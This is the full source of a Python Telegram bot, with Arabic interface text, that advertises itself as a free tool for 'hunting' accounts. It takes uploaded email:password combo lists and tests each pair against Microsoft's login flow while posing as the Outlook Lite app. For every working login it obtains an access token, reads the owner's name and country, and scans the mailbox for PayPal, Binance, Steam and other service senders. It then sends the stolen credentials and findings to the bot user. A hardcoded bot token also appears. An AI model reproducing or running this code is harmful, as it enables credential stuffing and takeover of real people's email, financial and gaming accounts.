import telebot
import requests
import uuid
from concurrent.futures import ThreadPoolExecutor
import threading
BOT_TOKEN = "7675888732:AAGXgu45Fe8dEutBTd1pwbpYZOLeTGh8VrQ"
bot = telebot.TeleBot(BOT_TOKEN)
selected_options = {}
check_results = {}
lock = threading.Lock()
def create_option_buttons(chat_id):
    markup = telebot.types.InlineKeyboardMarkup(row_width=3)
    options = [
        ('V1', '🎭 Facebook '),
        ('V2', '🎣 Instagram '),
        ('V3', '🎮 PUBG '),
        ('V4', '🕹️ Konami '),
        ('V5', '🎶 TikTok '),
        ('V6', '🐦 Twitter '),
        ('V7', '💰 PayPal '),
        ('V8', '🏦 Binance '),
        ('V9', '🎬 Netflix '),
        ('V10', '🏹 PlayStation '),
        ('V11', '🛡️ Supercell '),
        ('V12', '🏆 EpicGames '),
        ('V13', '🎵 Spotify '),
        ('V14', '⚡ Rockstar '),
        ('V15', '🎮 Xbox '),
        ('V16', '🏢 Microsoft '),
        ('V17', '🧩 Steam '),
        ('V18', '🔰 Roblox '),
        ('V19', '⚽ EA Sports '),
        ('V21', '🎮 Free Fire ')
    ]
    buttons = []
    for option, label in options:
        button_text = f'✅ {label}' if option in selected_options.get(chat_id, []) else label
        buttons.append(telebot.types.InlineKeyboardButton(button_text, callback_data=f'option_{option}'))
    markup.add(*buttons)
    markup.add(telebot.types.InlineKeyboardButton('✅ بدء الفحص', callback_data='start_check'))
    return markup

def update_button_text(option, chat_id):
    if option in selected_options[chat_id]:
        return f'✅ {option}'
    else:
        return option

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    if chat_id not in selected_options:
        selected_options[chat_id] = [] 
    markup = telebot.types.InlineKeyboardMarkup()
    item1 = telebot.types.InlineKeyboardButton('𝗖𝗵𝗮𝗻𝗻𝗲𝗹 🎁', callback_data='login')
   # item2 = telebot.types()
    markup.add(item1)
    bot.send_message(message.chat.id, '''- مرحبا بك في بوت صيد حسابات جميع البرامج والالعاب •☺️
- البوت مجاني ولا توجد فية اي اخطاء •
- مطورة البوت ࢪيفن : @F_M_D •

~ فقط قم بارسال ملف (كومبو) وثما اختر البرامج للفحص •🐬

• رابط قناتي هنا 👇: ''', reply_markup=markup)
@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        chat_id = message.chat.id
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_content = downloaded_file.decode('utf-8')
        global combo_list
        combo_list = file_content.splitlines()
        bot.send_message(chat_id, "الرجاء تحديد الخيارات التي تريد فحصها:", reply_markup=create_option_buttons(chat_id))
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ أثناء معالجة الملف: {e}")
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data

    if chat_id not in selected_options:
        selected_options[chat_id] = []

    if data.startswith('option_'):
        option = data[7:]
        if option in selected_options[chat_id]:
            selected_options[chat_id].remove(option)
        else:
            selected_options[chat_id].append(option)
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
    elif data == 'start_check':
        bot.send_message(chat_id, "انتظر جار بدء الفحص ...")
        with lock:
            check_results[chat_id] = {'good': 0, 'bad': 0, 'message_id': None}
        status_message = update_status_message(chat_id)
        check_results[chat_id]['message_id'] = status_message.message_id
        start_checking(chat_id)
    elif data == 'login':
        bot.send_message(chat_id, "قناتي : https://t.me/dev_raven")
    
def update_status_message(chat_id):
    good_count = check_results[chat_id]['good']
    bad_count = check_results[chat_id]['bad']
    message = f"""
* • لا تنسى صور الصيد 🤍*
✅ *Good : {good_count}*

❌ *Bad : {bad_count}*
"""
    if check_results[chat_id]['message_id']:
        bot.edit_message_text(message, chat_id=chat_id, message_id=check_results[chat_id]['message_id'], parse_mode="Markdown")
    else:
        return bot.send_message(chat_id, message, parse_mode="Markdown")
    return None
a, b = 0, 0
g1 = '\x1b[1;92m\x1b[38;5;208m'
g2 = '\x1b[1;33m'
g3 = '\x1b[1;92m\x1b[38;5;46m'
g5 = '\x1b[1;92m\x1b[38;5;212m'
g6 = '\x1b[1;92m\x1b[38;5;50m'

def get_infoo(Email, Password, token, CID, chat_id) -> str:
    he = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{CID}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()
        info_name = (r.get('names', []))
        info_Loca = (r.get('accounts', []))
        name = info_name[0]['displayName']
        Loca = info_Loca[0]['location']
    except:
        name = "غير متوفر"
        Loca = "غير متوفر"
    url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"
    headers = {
        "Host": "outlook.live.com",
        "content-length": "0",
        "x-owa-sessionid": f"{CID}",
        "x-req-source": "Mini",
        "authorization": f"Bearer {token}",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
        "action": "StartupData",
        "x-owa-correlationid": f"{CID}",
        "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "origin": "https://outlook.live.com",
        "x-requested-with": "com.microsoft.outlooklite",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://outlook.live.com/",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US,en;q=0.9"
    }
    try:
        rese = requests.post(url, headers=headers, data="").text
        V1 = 'ִ𓍼 ✅ ⌇ 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 . 𓍲' if 'V1' in selected_options.get(chat_id, []) and 'security@facebookmail.com' in rese else None
        V2 = 'ִ𓍼 ✅ ⌇ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 . 𓍲' if 'V2' in selected_options.get(chat_id, []) and 'security@mail.instagram.com' in rese else None
        V3 = 'ִ𓍼 ✅ ⌇ 𝗣𝗨𝗕𝗚 . 𓍲' if 'V3' in selected_options.get(chat_id, []) and "noreply@pubgmobile.com" in rese else None
        V4 = 'ִ𓍼 ✅ ⌇ 𝗞𝗼𝗻𝗮𝗺𝗶 . 𓍲' if 'V4' in selected_options.get(chat_id, []) and 'nintendo-noreply@ccg.nintendo.com' in rese else None
        V5 = 'ִ𓍼 ✅ ⌇ 𝗧𝗶𝗸𝗧𝗼𝗸 . 𓍲' if 'V5' in selected_options.get(chat_id, []) and 'TikTok' in rese else None
        V6 = 'ִ𓍼 ✅ ⌇ 𝗧𝘄𝗶𝘁𝘁𝗲𝗿 . 𓍲' if 'V6' in selected_options.get(chat_id, []) and 'info@x.com' in rese else None
        V7 = 'ִ𓍼 ✅ ⌇ 𝗣𝗮𝘆𝗣𝗮𝗹 . 𓍲' if 'V7' in selected_options.get(chat_id, []) and 'service@paypal.com.br' in rese else None
        V8 = 'ִ𓍼 ✅ ⌇ 𝗕𝗶𝗻𝗮𝗻𝗰𝗲 . 𓍲' if 'V8' in selected_options.get(chat_id, []) and 'do-not-reply@ses.binance.com' in rese else None
        V9 = 'ִ𓍼 ✅ ⌇ 𝗡𝗲𝘁𝗙𝗹𝗶𝘅 . 𓍲' if 'V9' in selected_options.get(chat_id, []) and 'info@account.netflix.com' in rese else None
        V10 = 'ִ𓍼 ✅ ⌇ 𝗣𝗹𝗮𝘆𝘀𝘁𝗮𝘁𝗶𝗼𝗻 . 𓍲' if 'V10' in selected_options.get(chat_id, []) and 'reply@txn-email.playstation.com' in rese else None
        V11 = 'ִ𓍼 ✅ ⌇ 𝗦𝘂𝗽𝗲𝗿𝗰𝗲𝗹𝗹 . 𓍲' if 'V11' in selected_options.get(chat_id, []) and 'noreply@id.supercell.com' in rese else None
        V12 = 'ִ𓍼 ✅ ⌇ 𝗘𝗽𝗶𝗰𝗚𝗮𝗺𝗲𝘀 . 𓍲' if 'V12' in selected_options.get(chat_id, []) and 'help@acct.epicgames.com' in rese else None
        V13 = 'ִ𓍼 ✅ ⌇ 𝗦𝗽𝗼𝘁𝗶𝗳𝘆 . 𓍲' if 'V13' in selected_options.get(chat_id, []) and 'no-reply@spotify.com' in rese else None
        V14 = 'ִ𓍼 ✅ ⌇ 𝗥𝗼𝗰𝗸𝘀𝘁𝗮𝗿 . 𓍲' if 'V14' in selected_options.get(chat_id, []) and 'noreply@rockstargames.com' in rese else None
        V15 = 'ִ𓍼 ✅ ⌇ 𝗫𝗯𝗼𝘅 . 𓍲' if 'V15' in selected_options.get(chat_id, []) and 'xboxreps@engage.xbox.com' in rese else None
        V16 = 'ִ𓍼 ✅ ⌇ 𝗠𝗶𝗰𝗿𝗼𝘀𝗼𝗳𝘁 . 𓍲' if 'V16' in selected_options.get(chat_id, []) and 'account-security-noreply@accountprotection.microsoft.com' in rese else None
        V17 = 'ִ𓍼 ✅ ⌇ 𝗦𝘁𝗲𝗮𝗺 . 𓍲' if 'V17' in selected_options.get(chat_id, []) and 'noreply@steampowered.com' in rese else None
        V18 = 'ִ𓍼 ✅ ⌇ 𝗥𝗼𝗯𝗹𝗼𝘅 . 𓍲' if 'V18' in selected_options.get(chat_id, []) and 'accounts@roblox.com' in rese else None
        V19 = 'ִ𓍼 ✅ ⌇ 𝗘𝗔 𝘀𝗽𝗼𝗿𝘁𝘀 . 𓍲' if 'V19' in selected_options.get(chat_id, []) and 'EA@e.ea.com' in rese else None
        #V20 = 'ִ𓍼 ✅ ⌇ . 𓍲' if 'V20' in selected_options.get(chat_id, []) and 'donotreply@xnxx.com' in rese else None
        V21 = 'ִ𓍼 ✅ ⌇ 𝗙𝗿𝗲𝗲 𝗙𝗶𝗿𝗲 . 𓍲' if 'V21' in selected_options.get(chat_id, []) and 'noreply@pornhub.com' in rese else None
    except:
        V1=V2=V3=V4=V5=V6=V7=V8=V9=V10=V11=V12=V13=V14=V15=V16=V17=V18=V19=V21 = None

    xb = filter(None, [V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, V12, V13, V14, V15, V16, V17, V18, V19, V21])
    zm = "\n".join(xb)
    jssj = {"AD": "🇦🇩","AE": "🇦🇪","AF": "🇦🇫","AG": "🇦🇬","AI": "🇦🇮","AL": "🇦🇱","AM": "🇦🇲","AO": "🇦🇴","AQ": "🇦🇶","AR": "🇦🇷","AS": "🇦🇸","AT": "🇦🇹","AU": "🇦🇺","AW": "🇦🇼","AX": "🇦🇽","AZ": "🇦🇿","BA": "🇧🇦","BB": "🇧🇧","BD": "🇧🇩","BE": "🇧🇪","BF": "🇧🇫","BG": "🇧🇬","BH": "🇧🇭","BI": "🇧🇮","BJ": "🇧🇯","BL": "🇧🇱","BM": "🇧🇲","BN": "🇧🇳","BO": "🇧🇴","BQ": "🇧🇶","BR": "🇧🇷","BS": "🇧🇸","BT": "🇧🇹","BV": "🇧🇻","BW": "🇧🇼","BY": "🇧🇾","BZ": "🇧🇿","CA": "🇨🇦","CC": "🇨🇨","CD": "🇨🇩","CF": "🇨🇫","CG": "🇨🇬","CH": "🇨🇭","CI": "🇨🇮","CK": "🇨🇰","CL": "🇨🇱","CM": "🇨🇲","CN": "🇨🇳","CO": "🇨🇴","CR": "🇨🇷","CU": "🇨🇺","CV": "🇨🇻","CW": "🇨🇼","CX": "🇨🇽","CY": "🇨🇾","CZ": "🇨🇿","DE": "🇩🇪","DJ": "🇩🇯","DK": "🇩🇰","DM": "🇩🇲","DO": "🇩🇴","DZ": "🇩🇿","EC": "🇪🇨","EE": "🇪🇪","EG": "🇪🇬","EH": "🇪🇭","ER": "🇪🇷","ES": "🇪🇸","ET": "🇪🇹","EU": "🇪🇺","FI": "🇫🇮","FJ": "🇫🇯","FK": "🇫🇰","FM": "🇫🇲","FO": "🇫🇴","FR": "🇫🇷","GA": "🇬🇦","GB-ENG": "🏴","GB-NIR": "🏴","GB-SCT": "🏴","GB-WLS": "🏴","GB": "🇬🇧","GD": "🇬🇩","GE": "🇬🇪","GF": "🇬🇫","GG": "🇬🇬","GH": "🇬🇭","GI": "🇬🇮","GL": "🇬🇱","GM": "🇬🇲","GN": "🇬🇳","GP": "🇬🇵","GQ": "🇬🇶","GR": "🇬🇷","GS": "🇬🇸","GT": "🇬🇹","GU": "🇬🇺","GW": "🇬🇼","GY": "🇬🇾","HK": "🇭🇰","HM": "🇭🇲","HN": "🇭🇳","HR": "🇭🇷","HT": "🇭🇹","HU": "🇭🇺","ID": "🇮🇩","IE": "🇮🇪","IL": "🇮🇱","IM": "🇮🇲","IN": "🇮🇳","IO": "🇮🇴","IQ": "🇮🇶","IR": "🇮🇷","IS": "🇮🇸","IT": "🇮🇹","JE": "🇯🇪","JM": "🇯🇲","JO": "🇯🇴","JP": "🇯🇵","KE": "🇰🇪","KG": "🇰🇬","KH": "🇰🇭","KI": "🇰🇮","KM": "🇰🇲","KN": "🇰🇳","KP": "🇰🇵","KR": "🇰🇷","KW": "🇰🇼","KY": "🇰🇾","KZ": "🇰🇿","LA": "🇱🇦","LB": "🇱🇧","LC": "🇱🇨","LI": "🇱🇮","LK": "🇱🇰","LR": "🇱🇷","LS": "🇱🇸","LT": "🇱🇹","LU": "🇱🇺","LV": "🇱🇻","LY": "🇱🇾","MA": "🇲🇦","MC": "🇲🇨","MD": "🇲🇩","ME": "🇲🇪","MF": "🇲🇫","MG": "🇲🇬","MH": "🇲🇭","MK": "🇲🇰","ML": "🇲🇱","MM": "🇲🇲","MN": "🇲🇳","MO": "🇲🇴","MP": "🇲🇵","MQ": "🇲🇶","MR": "🇲🇷","MS": "🇲🇸","MT": "🇲🇹","MU": "🇲🇺","MV": "🇲🇻","MW": "🇲🇼","MX": "🇲🇽","MY": "🇲🇾","MZ": "🇲🇿","NA": "🇳🇦","NC": "🇳🇨","NE": "🇳🇪","NF": "🇳🇫","NG": "🇳🇬","NI": "🇳🇮","NL": "🇳🇱","NO": "🇳🇴","NP": "🇳🇵","NR": "🇳🇷","NU": "🇳🇺","NZ": "🇳🇿","OM": "🇴🇲","PA": "🇵🇦","PE": "🇵🇪","PF": "🇵🇫","PG": "🇵🇬","PH": "🇵🇭","PK": "🇵🇰","PL": "🇵🇱","PM": "🇵🇲","PN": "🇵🇳","PR": "🇵🇷","PS": "🇵🇸","PT": "🇵🇹","PW": "🇵🇼","PY": "🇵🇾","QA": "🇶🇦","RE": "🇷🇪","RO": "🇷🇴","RS": "🇷🇸","RU": "🇷🇺","RW": "🇷🇼","SA": "🇸🇦","SB": "🇸🇧","SC": "🇸🇨","SD": "🇸🇩","SE": "🇸🇪","SG": "🇸🇬","SH": "🇸🇭","SI": "🇸🇮","SJ": "🇸🇯","SK": "🇸🇰","SL": "🇸🇱","SM": "🇸🇲","SN": "🇸🇳","SO": "🇸🇴","SR": "🇸🇷","SS": "🇸🇸","ST": "🇸🇹","SV": "🇸🇻","SX": "🇸🇽","SY": "🇸🇾","SZ": "🇸🇿","TC": "🇹🇨","TD": "🇹🇩","TF": "🇹🇫","TG": "🇹🇬","TH": "🇹🇭","TJ": "🇹🇯","TK": "🇹🇰","TL": "🇹🇱","TM": "🇹🇲","TN": "🇹🇳","TO": "🇹🇴","TR": "🇹🇷","TT": "🇹🇹","TV": "🇹🇻","TW": "🇹🇼","TZ": "🇹🇿","UA": "🇺🇦","UG": "🇺🇬","UM": "🇺🇲","US": "🇺🇸","UY": "🇺🇾","UZ": "🇺🇿","VA": "🇻🇦","VC": "🇻🇨","VE": "🇻🇪","VG": "🇻🇬","VI": "🇻🇮","VN": "🇻🇳","VU": "🇻🇺","WF": "🇼🇫","WS": "🇼🇸","XK": "🇽🇰","YE": "🇾🇪","YT": "🇾🇹","ZA": "🇿🇦","ZM": "🇿🇲","ZW": "🇿🇼"}
    cccc = jssj.get(Loca, '❔')
    print(f'''Good''')
    message = f"""⭒─ׅ─ׂ─ׂ─ׅ─ׂ─ׅ─ׂ─ ۰ 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 ۰ ─ׂ─ׅ─ׂ─ׅ─ׅ─ׂ─ׅ─⭒
𓇢 ⨾ 𝗘𝗺𝗮𝗶𝗹 𖠗 〔 `{Email}` 〕𐬹 ۫
𓇢 ⨾ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 𖠗 〔 `{Password}` 〕𐬹 ۫
⭒─ׅ─ׂ─ׂ─ׅ─ׂ─ׅ─ׂ─ ۰ 𝗜𝗡𝗙𝗢 ۰ ─ׂ─ׅ─ׂ─ׅ─ׅ─ׂ─ׅ─⭒
𓇢 ⨾ 𝗡𝗮𝗺𝗲 𖠗 〔 `{name}` 〕𐬹 ۫
𓇢 ⨾ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 𖠗 〔 {cccc} 〕𐬹 ۫
⭒─ׅ─ׂ─ׂ─ׅ─ׂ─ׅ─ׂ─ ۰ 𝗟𝗶𝗻𝗸𝗶𝗻𝗴 ۰ ─ׂ─ׅ─ׂ─ׅ─ׅ─ׂ─ׅ─⭒ 
{zm}
"""
    #requests.get(
        #f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto?chat_id={chat_id}&photo=https://t.me/gifgoldentest/7&caption={message}&parse_mode=Markdown&reply_markup={{"inline_keyboard":[[{{"text":"RAVEN","url":"http://t.me/vip_REMA"}}]]}}')
    bot.send_message(chat_id, message, parse_mode="Markdown")
    with lock:
        check_results[chat_id]['good'] += 1
    update_status_message(chat_id)


def login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id) -> str:
    global a, b
    try:
        lenn = f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={Password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        Ln = len(lenn)
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(Ln),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{AD}haschrome=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}
        res = requests.post(URL, data=lenn, headers=headers, allow_redirects=False)
        cook = res.cookies.get_dict()
        hh = res.headers
        if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
            get_token(Email, Password, cook, hh, chat_id)
            a += 1
        elif 'Too Many Requests' in res.text:
            login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id)
        else:
            b += 1
            print(f'{g1}- Bad Account .')
            with lock:
                check_results[chat_id]['bad'] += 1
            update_status_message(chat_id)
    except Exception as e:
        with lock:
            check_results[chat_id]['bad'] += 1
        update_status_message(chat_id)

def get_token(Email,Password,cook,hh,chat_id) -> str:
    Code = hh.get('Location').split('code=')[1].split('&')[0]
    CID = cook.get('MSPCID').upper()
    try:
        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
        "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
        "grant_type": "authorization_code",
        "code": Code,
        "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        token = response.json()["access_token"]
        get_infoo(Email,Password,token,CID,chat_id)
    except Exception as e:
        with lock:
            check_results[chat_id]['bad'] += 1
        update_status_message(chat_id)

def get_values(Email, Password, chat_id):
    headers = {
        #	    "Host": "login.microsoftonline.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "return-client-request-id": "false",
        "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
        "x-ms-sso-ignore-sso": "1",
        "correlation-id": str(uuid.uuid4()),
        "x-client-ver": "1.1.0+9e54a0d1",
        "x-client-os": "28",
        "x-client-sku": "MSAL.xplat.android",
        "x-client-src-sku": "MSAL.xplat.android",
        "X-Requested-With": "com.microsoft.outlooklite",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        response = requests.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + str(
                Email) + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers=headers)
        cok = response.cookies.get_dict()
        URL = response.text.split("urlPost:'")[1].split("'")[0]
        PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
        AD = response.url.split('haschrome=1')[0]
        MSPRequ = cok['MSPRequ']
        uaid = cok['uaid']
        RefreshTokenSso = cok['RefreshTokenSso']
        MSPOK = cok['MSPOK'],
        OParams = cok['OParams']
        login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id)
    except Exception as e:
        with lock:
            check_results[chat_id]['bad'] += 1
        update_status_message(chat_id)

def start_checking(chat_id):
    global combo_list
    executor = ThreadPoolExecutor(max_workers=10)

    futures = []
    for line in combo_list:
        try:
            if ':' in line:
                email = line.strip().split(':')[0]
                password = line.strip().split(':')[1]
                future = executor.submit(get_values, email, password, chat_id)
                futures.append(future)
            else:
                pass
        except Exception as e:
            with lock:
                check_results[chat_id]['bad'] += 1
            update_status_message(chat_id)
    for future in futures:
        try:
            future.result()
        except Exception as e:
            print(f"Exception in thread: {e}")
            with lock:
                check_results[chat_id]['bad'] += 1
            update_status_message(chat_id)


    executor.shutdown(wait=True)
    bot.send_message(chat_id, "تم الانتهاء من الفحص ...")
print('البوت يعمل ...')
bot.enable_save_next_step_handlers(delay=2)

bot.load_next_step_handlers()

bot.infinity_polling()
